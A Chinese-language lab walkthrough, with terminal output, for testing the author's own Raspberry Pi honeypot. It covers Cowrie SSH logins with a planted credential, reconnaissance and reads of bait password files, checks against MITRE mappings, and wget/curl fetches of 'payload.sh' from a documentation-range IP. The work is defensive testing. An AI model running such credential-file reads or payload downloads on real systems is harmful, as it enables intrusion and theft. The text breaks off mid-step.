# 第十一階段：測試攻擊情境
```
這一階段的目標是用「受控、低風險、只打自己的 Raspberry Pi 實驗環境」的方式，產生一組測試攻擊行為，確認你的平台可以完整做到：
攻擊互動
    ↓
Cowrie / Fake Web 記錄 log
    ↓
collect_logs.sh 收集
    ↓
run_parser.sh 解析
    ↓
run_mapping.sh 對應 MITRE
    ↓
generate_report.sh 產生報告

#第十一階段安全前提：本階段只允許測試你自己的實驗環境：
Raspberry Pi IP: 192.168.1.167
真實 SSH 管理 port: 22
Cowrie SSH honeypot port: 2222
Fake Web Admin port: 8080
不要對學校網段、真實內網、公開網站、別人的主機執行掃描或攻擊測試。
```
## 第十一階段測試目標
```
完成後，你會驗證以下情境：
[完成] SSH 登入失敗測試
[完成] SSH honeycredential 成功登入測試
[完成] SSH 偵察指令測試
[完成] SSH honeyfile 存取測試
[完成] SSH 工具下載行為測試
[完成] Web 登入失敗測試
[完成] Web honeycredential 使用測試
[完成] Web honeyfile 下載測試
[完成] Web scanner path 探測測試
[完成] 重新收集 log
[完成] 重新執行 parser
[完成] 重新執行 mapping
[完成] 重新產生 report
[完成] 驗證 detections 增加
```
### Step 11.1：確認服務狀態
- 請先在 Raspberry Pi 上執行：
```
cd /opt/deception-lab
/opt/deception-lab/scripts/status_lab.sh

# 你要確認：
deception-cowrie     Up
deception-fake-web   Up
0.0.0.0:2222
0.0.0.0:8080
如果服務沒有起來，先執行：/opt/deception-lab/scripts/start_lab.sh

# 執行結果：
lss@lss:/opt/deception-lab $ /opt/deception-lab/scripts/status_lab.sh
=== Docker Compose Services ===
NAME                 IMAGE                    COMMAND                  SERVICE    CREATED      STATUS        PORTS
deception-cowrie     cowrie/cowrie:latest     "/cowrie/cowrie-env/…"   cowrie     9 days ago   Up 39 hours   0.0.0.0:2222->2222/tcp, [::]:2222->2222/tcp, 2223/tcp
deception-fake-web   deception-lab-fake-web   "gunicorn --bind 0.0…"   fake-web   9 days ago   Up 39 hours   0.0.0.0:8080->8080/tcp, [::]:8080->8080/tcp

=== Docker Networks ===
e3ff41c4fcca   deception-lab_deception_net   bridge    local

=== Listening Ports ===
[sudo] password for lss:
tcp   LISTEN 0      4096         0.0.0.0:2222       0.0.0.0:*    users:(("docker-proxy",pid=1652,fd=8))
tcp   LISTEN 0      4096         0.0.0.0:8080       0.0.0.0:*    users:(("docker-proxy",pid=1631,fd=8))
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=1188,fd=6))
tcp   LISTEN 0      4096            [::]:2222          [::]:*    users:(("docker-proxy",pid=1658,fd=8))
tcp   LISTEN 0      4096            [::]:8080          [::]:*    users:(("docker-proxy",pid=1638,fd=8))
tcp   LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=1188,fd=7))

=== Disk Usage ===
Filesystem      Size  Used Avail Use% Mounted on
/dev/mmcblk0p2   58G  5.2G   50G  10% /

=== Log Directories ===
16K     /opt/deception-lab/data/logs/cowrie
16K     /opt/deception-lab/data/logs/web

=== Collected Logs ===
total 44K
drwxrwxr-x 2 lss lss 4.0K May 15 07:18 .
drwxrwxr-x 8 lss lss 4.0K May 13 03:01 ..
-rw-rw-r-- 1 lss lss  370 May 22 03:30 collection_summary.txt
-rw-rw-r-- 1 lss lss  12K May 22 03:30 cowrie-docker.log
-rw-rw-r-- 1 lss lss  579 May 15 07:18 README.md
-rw-rw-r-- 1 lss lss  777 May 22 03:30 source_manifest.json
-rwxrwxr-x 1 lss lss 6.5K May 22 03:30 web_access.jsonl
-rwxrwxr-x 1 lss lss 1.7K May 22 03:30 web_auth.jsonl

=== Latest Collection Summary ===
Collection time UTC: 20260521T193038Z

Collected files:

- /opt/deception-lab/data/collected/cowrie-docker.log
  size: 12K
  lines: 93
- /opt/deception-lab/data/collected/web_access.jsonl
  size: 8.0K
  lines: 19
- /opt/deception-lab/data/collected/web_auth.jsonl
  size: 4.0K
  lines: 4
- /opt/deception-lab/data/collected/source_manifest.json
  size: 4.0K
  lines: 26

# 確認：Step 11.1 已完成，服務狀態正常。
你的輸出顯示目前平台核心服務都正常運作：
| 檢查項目                 | 結果                            | 狀態   |
| -------------------- | ----------------------------- | ---- |
| Cowrie container     | `Up 39 hours`                 | ✅ 正常 |
| Fake Web container   | `Up 39 hours`                 | ✅ 正常 |
| Docker network       | `deception-lab_deception_net` | ✅ 正常 |
| 真實 SSH 管理 port       | `22` LISTEN                   | ✅ 正常 |
| Cowrie honeypot port | `2222` LISTEN                 | ✅ 正常 |
| Fake Web port        | `8080` LISTEN                 | ✅ 正常 |
| 磁碟空間                 | 58G 總容量，50G 可用                | ✅ 足夠 |
| Cowrie log 目錄        | 16K                           | ✅ 存在 |
| Web log 目錄           | 16K                           | ✅ 存在 |
| collected logs       | 已存在                           | ✅ 正常 |

#重點成功訊號是這兩行：
eception-cowrie     ... Up 39 hours   0.0.0.0:2222->2222/tcp
deception-fake-web   ... Up 39 hours   0.0.0.0:8080->8080/tcp

# 以及 port 監聽：
0.0.0.0:2222
0.0.0.0:8080
0.0.0.0:22

# 所以目前可以判定：
22    真實 Raspberry Pi SSH 管理入口正常
2222  Cowrie SSH honeypot 正常
8080  Fake Web Admin Panel 正常

# 小提醒
目前 Latest Collection Summary 的時間是：20260521T193038Z
這是上一次 log 收集時間。等你完成第十一階段測試後，會在後面的步驟重新執行：
/opt/deception-lab/scripts/collect_logs.sh
或
/opt/deception-lab/scripts/generate_report.sh
到時候 collected logs 會刷新。
```
- Step 11.2：先產生一份測試前報告
```
# 執行：
/opt/deception-lab/scripts/generate_report.sh

# 執行結果：
lss@lss:/opt/deception-lab $ /opt/deception-lab/scripts/generate_report.sh
[+] Refreshing parser and mapping outputs...
[+] Running parser first to refresh detections...
[+] Collecting latest logs...
[+] Collecting logs at UTC time: 20260521T194529Z
[+] Exporting Cowrie Docker logs...
[+] Collecting Fake Web access log...
[+] Collecting Fake Web auth log...
[+] Creating source manifest...
[+] Creating collection summary...
[+] Archiving collected logs...

[+] Collection completed.
[+] Current collected directory:
total 44K
drwxrwxr-x 2 lss lss 4.0K May 15 07:18 .
drwxrwxr-x 8 lss lss 4.0K May 13 03:01 ..
-rw-rw-r-- 1 lss lss  370 May 22 03:45 collection_summary.txt
-rw-rw-r-- 1 lss lss  12K May 22 03:45 cowrie-docker.log
-rw-rw-r-- 1 lss lss  579 May 15 07:18 README.md
-rw-rw-r-- 1 lss lss  777 May 22 03:45 source_manifest.json
-rwxrwxr-x 1 lss lss 6.5K May 22 03:45 web_access.jsonl
-rwxrwxr-x 1 lss lss 1.7K May 22 03:45 web_auth.jsonl

[+] Summary:
Collection time UTC: 20260521T194529Z

Collected files:

- /opt/deception-lab/data/collected/cowrie-docker.log
  size: 12K
  lines: 93
- /opt/deception-lab/data/collected/web_access.jsonl
  size: 8.0K
  lines: 19
- /opt/deception-lab/data/collected/web_auth.jsonl
  size: 4.0K
  lines: 4
- /opt/deception-lab/data/collected/source_manifest.json
  size: 4.0K
  lines: 26

[+] Running event parser...
[+] Parsing completed.
[+] Events written to: /opt/deception-lab/data/events/events.jsonl
[+] Detections written to: /opt/deception-lab/data/events/detections.jsonl
[+] Summary written to: /opt/deception-lab/data/events/events_summary.json

Total events: 34
Total detections: 11

[+] Event output files:
total 52K
drwxrwxr-x 2 lss lss 4.0K May 21 07:53 .
drwxrwxr-x 8 lss lss 4.0K May 13 03:01 ..
-rw-rw-r-- 1 lss lss 2.9K May 22 03:30 attack_coverage.json
-rw-rw-r-- 1 lss lss 6.9K May 22 03:45 detections.jsonl
-rw-rw-r-- 1 lss lss 2.2K May 22 03:30 engage_coverage.json
-rw-rw-r-- 1 lss lss  13K May 22 03:45 events.jsonl
-rw-rw-r-- 1 lss lss  631 May 22 03:45 events_summary.json
-rw-rw-r-- 1 lss lss 6.1K May 22 03:30 mapping_summary.json

[+] Event summary:
{
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 1,
    "SSH_HONEYFILE_ACCESS": 1,
    "SSH_RECON_COMMAND": 5,
    "WEB_HONEYCREDENTIAL_USED": 2,
    "WEB_HONEYFILE_ACCESS": 2
  },
  "detections_by_severity": {
    "high": 6,
    "medium": 5
  },
  "events_by_source": {
    "cowrie": 11,
    "fake-web": 23
  },
  "events_by_type": {
    "ssh_command": 8,
    "ssh_connection": 1,
    "ssh_login_success": 1,
    "ssh_logout": 1,
    "web_honeyfile_access": 2,
    "web_login_attempt": 4,
    "web_request": 17
  },
  "generated_at": "2026-05-21T19:45:29.297561+00:00",
  "total_detections": 11,
  "total_events": 34
}
[+] Running MITRE mapping analyzer...
[+] Mapping analysis completed.
[+] Mapping summary: /opt/deception-lab/data/events/mapping_summary.json
[+] ATT&CK coverage: /opt/deception-lab/data/events/attack_coverage.json
[+] Engage coverage: /opt/deception-lab/data/events/engage_coverage.json

Defined detection rules: 8
Total detections: 11
ATT&CK mapping coverage: 100.0%
Engage mapping coverage: 100.0%

[+] Generating mapping Markdown report...
[+] Mapping markdown report written to: /opt/deception-lab/reports/mapping_report.md

[+] Mapping output files:
-rw-rw-r-- 1 lss lss 2.9K May 22 03:45 attack_coverage.json
-rw-rw-r-- 1 lss lss 2.2K May 22 03:45 engage_coverage.json
-rw-rw-r-- 1 lss lss 6.1K May 22 03:45 mapping_summary.json

[+] Mapping report:
-rw-rw-r-- 1 lss lss 2.0K May 22 03:45 /opt/deception-lab/reports/mapping_report.md

[+] Mapping summary:
{
  "attack_mapping_coverage": {
    "coverage_percent": 100.0,
    "mapped_defined_rules": 8,
    "total_defined_rules": 8,
    "triggered_without_mapping": [],
    "unmapped_defined_rules": []
  },
  "defined_detection_rules": 8,
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 1,
    "SSH_HONEYFILE_ACCESS": 1,
    "SSH_RECON_COMMAND": 5,
    "WEB_HONEYCREDENTIAL_USED": 2,
    "WEB_HONEYFILE_ACCESS": 2
  },
  "engage_mapping_coverage": {
    "coverage_percent": 100.0,
    "mapped_defined_rules": 8,
    "total_defined_rules": 8,
    "triggered_without_mapping": [],
    "unmapped_defined_rules": []
  },
  "generated_at": "2026-05-21T19:45:29.375059+00:00",
  "input_detections": "/opt/deception-lab/data/events/detections.jsonl",
  "per_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": {
      "attack": {
        "rationale": "The attacker used a credential intentionally planted in deception assets. This indicates exposure to unsecured credential material.\n",
        "tactic": "Credential Access",
        "technique": "Unsecured Credentials",
        "technique_id": "T1552"
      },
      "detections": 1,
      "engage": {
        "activity": "Credential Collection",
        "goal": "Elicit",
        "rationale": "A planted SSH credential caused the adversary to reveal credential-use behavior.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_HONEYFILE_ACCESS": {
      "attack": {
        "rationale": "Attempting to read honeyfiles such as secrets.txt or backup_config.ini indicates interest in local sensitive data.\n",
        "tactic": "Collection",
        "technique": "Data from Local System",
        "technique_id": "T1005"
      },
      "detections": 1,
      "engage": {
        "activity": "Reveal Adversary Intent",
        "goal": "Elicit",
        "rationale": "Honeyfile access attempts reveal interest in sensitive files, backup data, credentials, and local configuration.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_LOGIN_FAILED": {
      "attack": {
        "rationale": "Failed SSH authentication attempts against the honeypot indicate password guessing or brute-force behavior.\n",
        "tactic": "Credential Access",
        "technique": "Brute Force",
        "technique_id": "T1110"
      },
      "detections": 0,
      "engage": {
        "activity": "Expose Decoy Service",
        "goal": "Expose",
        "rationale": "The SSH honeypot exposes a fake login surface for observing authentication attempts.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_RECON_COMMAND": {
      "attack": {
        "rationale": "Commands such as whoami, pwd, ls, uname, ip addr, ifconfig, ps, and netstat indicate post-login discovery activity.\n",
        "related_techniques": [
          "T1033 System Owner/User Discovery",
          "T1016 System Network Configuration Discovery",
          "T1057 Process Discovery"
        ],
        "tactic": "Discovery",
        "technique": "System Information Discovery",
        "technique_id": "T1082"
      },
      "detections": 5,
      "engage": {
        "activity": "Collect Adversary Behavior",
        "goal": "Understand",
        "rationale": "Commands entered after login reveal adversary discovery interests and operating style.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "SSH_TOOL_TRANSFER_COMMAND": {
      "attack": {
        "rationale": "Commands such as wget, curl, ftp, scp, chmod, nc, or bash reverse shell patterns may indicate tool staging or payload transfer.\n",
        "tactic": "Command and Control",
        "technique": "Ingress Tool Transfer",
        "technique_id": "T1105"
      },
      "detections": 0,
      "engage": {
        "activity": "Adversary Direction",
        "goal": "Affect",
        "rationale": "A decoy shell can influence attacker behavior and redirect tool staging activity into a controlled observation environment.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_HONEYCREDENTIAL_USED": {
      "attack": {
        "rationale": "Submitting a planted credential to the fake web login panel indicates the adversary discovered and attempted to use unsecured credentials.\n",
        "tactic": "Credential Access",
        "technique": "Unsecured Credentials",
        "technique_id": "T1552"
      },
      "detections": 2,
      "engage": {
        "activity": "Credential Collection",
        "goal": "Elicit",
        "rationale": "Planted web credentials elicit credential reuse behavior against the fake admin panel.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_HONEYFILE_ACCESS": {
      "attack": {
        "rationale": "Downloading honeyfiles from the fake web panel indicates attempted collection of local or exposed files.\n",
        "tactic": "Collection",
        "technique": "Data from Local System",
        "technique_id": "T1005"
      },
      "detections": 2,
      "engage": {
        "activity": "Collect Adversary Behavior",
        "goal": "Understand",
        "rationale": "Honeyfile download behavior helps identify the attacker's collection interests.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    },
    "WEB_SCANNER_PROBE": {
      "attack": {
        "rationale": "Requests to paths such as /.env, /wp-admin, /phpmyadmin, or /admin indicate web probing or scanning behavior.\n",
        "tactic": "Reconnaissance",
        "technique": "Active Scanning",
        "technique_id": "T1595"
      },
      "detections": 0,
      "engage": {
        "activity": "Expose Decoy Service",
        "goal": "Expose",
        "rationale": "The fake web interface exposes probeable paths to observe scanner behavior.\n"
      },
      "has_attack_mapping": true,
      "has_engage_mapping": true
    }
  },
  "total_detections": 11,
  "triggered_detection_rules": [
    "SSH_HONEYCREDENTIAL_LOGIN",
    "SSH_HONEYFILE_ACCESS",
    "SSH_RECON_COMMAND",
    "WEB_HONEYCREDENTIAL_USED",
    "WEB_HONEYFILE_ACCESS"
  ]
}

[+] Generating timeline and final reports...
/opt/deception-lab/parser/generate_timeline.py:93: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  lines.append(f"Generated at: {datetime.utcnow().isoformat()}Z")
[+] Timeline written to: /opt/deception-lab/reports/timeline.md
[+] Markdown report written to: /opt/deception-lab/reports/report.md
[+] JSON report written to: /opt/deception-lab/reports/report.json

[+] Report files:
total 40K
drwxrwxr-x 2 lss lss 4.0K May 22 03:11 .
drwxr-xr-x 8 lss lss 4.0K May 22 03:32 ..
-rw-rw-r-- 1 lss lss 2.0K May 22 03:45 mapping_report.md
-rw-rw-r-- 1 lss lss  12K May 22 03:45 report.json
-rw-rw-r-- 1 lss lss 5.4K May 22 03:45 report.md
-rw-rw-r-- 1 lss lss 8.0K May 22 03:45 timeline.md

[+] Report generation completed.
Main report: /opt/deception-lab/reports/report.md
Timeline:    /opt/deception-lab/reports/timeline.md
JSON report: /opt/deception-lab/reports/report.json

------------------------------------------------------------------
# 然後查看目前 baseline：
cat /opt/deception-lab/reports/report.json | jq '.summary'

執行結果：
lss@lss:/opt/deception-lab $ cat /opt/deception-lab/reports/report.json | jq '.summary'
{
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 1,
    "SSH_HONEYFILE_ACCESS": 1,
    "SSH_RECON_COMMAND": 5,
    "WEB_HONEYCREDENTIAL_USED": 2,
    "WEB_HONEYFILE_ACCESS": 2
  },
  "detections_by_severity": {
    "high": 6,
    "medium": 5
  },
  "events_by_source": {
    "cowrie": 11,
    "fake-web": 23
  },
  "events_by_type": {
    "ssh_command": 8,
    "ssh_connection": 1,
    "ssh_login_success": 1,
    "ssh_logout": 1,
    "web_honeyfile_access": 2,
    "web_login_attempt": 4,
    "web_request": 17
  },
  "honeycredential_detections": 3,
  "honeyfile_detections": 3,
  "total_detections": 11,
  "total_events": 34
}
```

### Step 11.2：先產生一份測試前報告
- 執行：
```
這一步是建立 baseline，方便等等比較測試後的變化。
/opt/deception-lab/scripts/generate_report.sh

# 記錄目前 summary：
cat /opt/deception-lab/reports/report.json | jq '.summary'

# 你目前大概會看到：
{
  "total_events": 34,
  "total_detections": 11,
  "honeycredential_detections": 3,
  "honeyfile_detections": 3
}
數字不一定要完全一樣，重點是後面測試後會增加。
```

### Step 11.3：建立測試紀錄資料夾
- 執行：
```
mkdir -p /opt/deception-lab/data/test-scenarios
```
- 建立測試說明檔：
```
cat > /opt/deception-lab/data/test-scenarios/phase11_test_plan.md <<'EOF'
# Phase 11 Test Plan

This file records controlled attack-scenario tests against the local Raspberry Pi deception lab.

Targets:

- Cowrie SSH honeypot: 192.168.1.167:2222
- Fake Web Admin Panel: http://192.168.1.167:8080

Safety:

- Only test against this Raspberry Pi lab.
- Do not test against external hosts.
- Do not use real credentials.
- Do not use real malware or exploit payloads.
EOF
```

### Step 11.4：測試 SSH 登入失敗
- 這個測試模擬攻擊者猜錯密碼。
```
# 在 Raspberry Pi 上執行：
ssh-keygen -f '/home/lss/.ssh/known_hosts' -R '[127.0.0.1]:2222'

# 接著測試登入：
ssh -p 2222 root@127.0.0.1

# 第一次看到：
Are you sure you want to continue connecting?
輸入：yes
密碼輸入：123456
如果它再次要求密碼，你可以按：Ctrl + C

# 這會產生 SSH failed login log。

# 執行結果：
lss@lss:/opt/deception-lab $ ssh-keygen -f '/home/lss/.ssh/known_hosts' -R '[127.0.0.1]:2222'
# Host [127.0.0.1]:2222 found: line 1
/home/lss/.ssh/known_hosts updated.
Original contents retained as /home/lss/.ssh/known_hosts.old
lss@lss:/opt/deception-lab $ ssh -p 2222 root@127.0.0.1
The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:Gx/iT67Oyb1w3bqEXlZzeWi0jpTa4wnbH/Wb2Iuw0QE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:2222' (ED25519) to the list of known hosts.
root@127.0.0.1's password:
Permission denied, please try again.
root@127.0.0.1's password:
```

### Step 11.5：測試 SSH honeycredential 成功登入
- 現在測試真正的 honeycredential。
```
執行：
ssh -p 2222 backup@127.0.0.1

# 密碼輸入：Backup2026!

# 如果成功，會進入 Cowrie 假 shell，類似：
backup@svr04:~$

# 執行結果：
lss@lss:/opt/deception-lab $ ssh -p 2222 backup@127.0.0.1
backup@127.0.0.1's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
backup@svr04:~$
```

### Step 11.6：在 Cowrie 假 shell 中執行偵察指令
- 登入 Cowrie 後，依序輸入：
```
whoami
id
pwd
ls
uname -a
ps aux

# 這些是常見偵察指令，應該會被 parser 偵測為：
SSH_RECON_COMMAND
如果有些指令顯示 command not found，也沒關係，Cowrie 仍然會記錄你輸入過。

# 執行結果：
backup@svr04:~$ whoami
backup
backup@svr04:~$ id
uid=34(backup) gid=34(backup) groups=34(backup)
backup@svr04:~$ pwd
/var/backups
backup@svr04:~$ ls
backup@svr04:~$ uname -a
Linux svr04 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux
backup@svr04:~$ ps aux
USER         PID   %CPU       %MEM       VSZ       RSS       TTY     STAT  START TIME  COMMAND
root         1     0.0        0.89       180281344 4587520   ?       Ss    Jul22 0.48  /lib/systemd/systemd --system --deserialize 20
root         2     0.0        0.0        0         0         ?       S<    Jul22 0.0   [kthreadd]
root         3     0.0        0.0        0         0         ?       S<    Jul22 0.0   [ksoftirqd/0]
root         5     0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/0:0H]
root         7     0.0        0.0        0         0         ?       Ss    Jul22 0.0   [rcu_sched]
root         8     0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [rcu_bh]
root         9     0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [migration/0]
root         10    0.0        0.0        0         0         ?       S<    Jul22 0.0   [watchdog/0]
root         11    0.0        0.0        0         0         ?       D<    Jul22 0.0   [watchdog/1]
root         12    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [migration/1]
root         13    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [ksoftirqd/1]
root         15    0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/1:0H]
root         16    0.0        0.0        0         0         ?       D<    Jul22 0.0   [khelper]
root         17    0.0        0.0        0         0         ?       S<    Jul22 0.0   [kdevtmpfs]
root         18    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [netns]
root         19    0.0        0.0        0         0         ?       D<    Jul22 0.0   [khungtaskd]
root         20    0.0        0.0        0         0         ?       S<    Jul22 0.0   [writeback]
root         21    0.0        0.0        0         0         ?       S<    Jul22 0.0   [ksmd]
root         22    0.0        0.0        0         0         ?       S<    Jul22 0.0   [crypto]
root         23    0.0        0.0        0         0         ?       S<    Jul22 0.0   [kintegrityd]
root         24    0.0        0.0        0         0         ?       D<    Jul22 0.0   [bioset]
root         25    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [kblockd]
root         27    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [kswapd0]
root         28    0.0        0.0        0         0         ?       S<    Jul22 0.0   [vmstat]
root         29    0.0        0.0        0         0         ?       S<    Jul22 0.0   [fsnotify_mark]
root         35    0.0        0.0        0         0         ?       S<    Jul22 0.0   [kthrotld]
root         37    0.0        0.0        0         0         ?       S<    Jul22 0.0   [ipv6_addrconf]
root         38    0.0        0.0        0         0         ?       D<    Jul22 0.0   [deferwq]
root         39    0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/u4:1]
root         74    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [ata_sff]
root         75    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [kpsmoused]
root         78    0.0        0.0        0         0         ?       S<    Jul22 0.0   [scsi_eh_0]
root         79    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [scsi_tmf_0]
root         80    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [kworker/u4:2]
root         83    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [kworker/1:1H]
root         88    0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/0:1H]
root         103   0.0        0.0        0         0         ?       D<    Jul22 0.0   [jbd2/sda1-8]
root         104   0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [ext4-rsv-conver]
root         135   0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [kauditd]
root         141   0.0        0.43       41754624  2211840   ?       Ss    Jul22 0.05  /lib/systemd/systemd-udevd
root         150   0.0        1.12       38326272  5820416   ?       S<    Jul22 0.16  /lib/systemd/systemd-journald
root         360   0.0        0.35       37969920  1789952   ?       Ss    Jul22 0.0   /sbin/rpcbind -w
statd        382   0.0        0.34       38174720  1748992   ?       Ss+   Jul22 0.0   /sbin/rpc.statd
root         387   0.0        0.0        0         0         ?       D<    Jul22 0.0   [rpciod]
root         392   0.0        0.0        0         0         ?       Ss    Jul22 0.0   [nfsiod]
root         407   0.0        0.0        23916544  12288     ?       Ss    Jul22 0.0   /usr/sbin/rpc.idmapd
root         413   0.0        0.31       19480576  1597440   ?       Ss    Jul22 0.0   /usr/sbin/atd -f
root         414   0.0        0.51       28135424  2641920   ?       Ss    Jul22 0.01  /usr/sbin/cron -f
root         417   0.0        0.34       20332544  1757184   ?       Ss+   Jul22 0.05  /lib/systemd/systemd-logind
messagebus   419   0.0        0.51       43245568  2646016   ?       Ss+   Jul22 0.52  /usr/bin/dbus-daemon --system --address=systemd: --nofork
root         425   0.0        0.4        264880128 2088960   ?       D<    Jul22 0.04  /usr/sbin/rsyslogd -n
root         427   0.0        0.31       4358144   1585152   ?       Ss    Jul22 0.0   /usr/sbin/acpid
root         442   0.0        0.33       14761984  1708032   tty1    Ss    Jul22 0.0   /sbin/agetty --noclear tty1 linux
root         448   0.0        0.59       56508416  3067904   ?       D<    Jul22 0.01  /usr/sbin/sshd -D
Debian-exim  682   0.0        0.42       54530048  2154496   ?       D<    Jul22 0.0   /usr/sbin/exim4 -bd -q30m
root         697   0.0        0.11       26009600  589824    ?       Ss    Jul22 0.0   dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/
root         8574  0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [iprt-VBoxWQueue]
root         8611  0.0        0.0        0         0         ?       D<    Jul22 0.0   [ttm_swap]
root         8743  0.0        0.21       307101696 1064960   ?       Ss    Jul22 0.17  /usr/sbin/VBoxService --pidfile /var/run/vboxadd-service.
root         9030  0.0        0.47       26009600  2424832   ?       Ss+   Jul22 0.0   dhclient -v -pf /run/dhclient.eth1.pid -lf /var/lib/dhcp/
root         21704 0.0        0.29       4440064   1507328   ?       D<    Jul22 0.0   /bin/sh /usr/bin/mysqld_safe
mysql        22049 0.0        9.28       137470771248103424  ?       S<    Jul22 5.91  /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql
ejabberd     25061 0.0        0.05       27955200  233472    ?       Ss    Jul23 0.14  /usr/lib/erlang/erts-6.2/bin/epmd -daemon
root         25065 0.0        0.0        0         0         ?       Ss+   Jul23 0.0   [kworker/0:0]
ejabberd     25095 0.0        8.87       968404992 45989888  ?       Ss    Jul23 3.41  /usr/lib/erlang/erts-6.2/bin/beam.smp -K true -P 250000 -
root         25970 0.0        0.0        0         0         ?       D<    Jul23 0.0   [kworker/1:0]
root         26418 0.0        0.6        93380608  3092480   ?       Ss+   Jul23 0.0   nginx: master process /usr/sbin/nginx -g daemon on; maste
www-data     26419 0.0        0.73       93704192  3760128   ?       Ss+   Jul23 0.29  nginx: worker process
www-data     26420 0.0        0.73       93704192  3760128   ?       D<    Jul23 0.36  nginx: worker process
www-data     26421 0.0        0.73       93704192  3760128   ?       Ss+   Jul23 0.2   nginx: worker process
www-data     26422 0.0        0.73       93704192  3760128   ?       D<    Jul23 0.45  nginx: worker process
root         28001 0.0        0.0        0         0         ?       Ss    Jul23 0.0   [kworker/0:2]
root         28002 0.0        0.0        0         0         ?       Ss    Jul23 0.0   [kworker/1:1]
root         4392  0.0        0.1        5416      1024      ?       Ss    Jul22 0:00  /usr/sbin/sshd: backup@pts/0
backup       4397  0.0        0.1        5416      1024      pts/0   Ss    06:30 0:00  -bash
backup       4399  0.0        0.1        2435      929       pts/0   Ss    06:30 0:00  ps aux
```

### Step 11.7：測試 SSH honeyfile 存取
- 繼續在 Cowrie 假 shell 裡輸入：
```
cat /home/admin/secrets.txt
cat /home/admin/backup_config.ini
cat /home/admin/database_passwords.txt
cat /home/backup/backup_jobs.txt
cat /etc/edge-gateway/app.conf

# 即使檔案在 Cowrie shell 裡顯示不存在，也沒有關係。
重點是 Cowrie log 會記錄：CMD: cat /home/admin/secrets.txt

#parser 會依照命令字串中的 honeyfile 名稱判斷：SSH_HONEYFILE_ACCESS

# 執行結果：
lss@lss:/opt/deception-lab $ cat /home/admin/secrets.txtcat /home/admin/secrets.txt
cat: /home/admin/secrets.txt: No such file or directory
lss@lss:/opt/deception-lab $ cat /home/admin/backup_config.inicat /home/admin/backup_config.ini
cat: /home/admin/backup_config.ini: No such file or directory
lss@lss:/opt/deception-lab $ cat /home/admin/database_passwords.txtcat /home/admin/database_passwords.txt
cat: /home/admin/database_passwords.txt: No such file or directory
lss@lss:/opt/deception-lab $ cat /home/backup/backup_jobs.txtcat /home/backup/backup_jobs.txt
cat: /home/backup/backup_jobs.txt: No such file or directory
lss@lss:/opt/deception-lab $ cat /etc/edge-gateway/app.confcat /etc/edge-gateway/app.conf
cat: /etc/edge-gateway/app.conf: No such file or directory

backup@svr04:~$ cat /home/admin/secrets.txt
cat: /home/admin/secrets.txt: No such file or directory
backup@svr04:~$ cat /home/admin/backup_config.ini
cat: /home/admin/backup_config.ini: No such file or directory
backup@svr04:~$ cat /home/admin/database_passwords.txt
cat: /home/admin/database_passwords.txt: No such file or directory
backup@svr04:~$ cat /home/backup/backup_jobs.txt
cat: /home/backup/backup_jobs.txt: No such file or directory
backup@svr04:~$ cat /etc/edge-gateway/app.conf
cat: /etc/edge-gateway/app.conf: No such file or directory
```

### Step 11.8：測試 SSH 工具下載行為
- 繼續在 Cowrie 假 shell 裡輸入以下安全測試命令：
```
wget http://192.0.2.123/a.sh
curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
chmod +x /tmp/payload.sh

# 說明：
192.0.2.0/24 是文件範例用 IP，不是真實攻擊目標。
這些命令只是輸入到 Cowrie 假 shell，用來產生 log。

# 這些應該會被 parser 偵測為：SSH_TOOL_TRANSFER_COMMAND

完成後離開 Cowrie：exit

# 執行結果：
backup@svr04:~$ wget http://192.0.2.123/a.sh
--2026-05-22 04:06:35--  http://192.0.2.123/a.sh
Connecting to 192.0.2.123:80... connected.
HTTP request sent, awaiting response...
^C
backup@svr04:~$ cancel failed: Operation timed out.
backup@svr04:~$ curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
curl: (7) Failed to connect to 192.0.2.123 port 80: Operation timed out
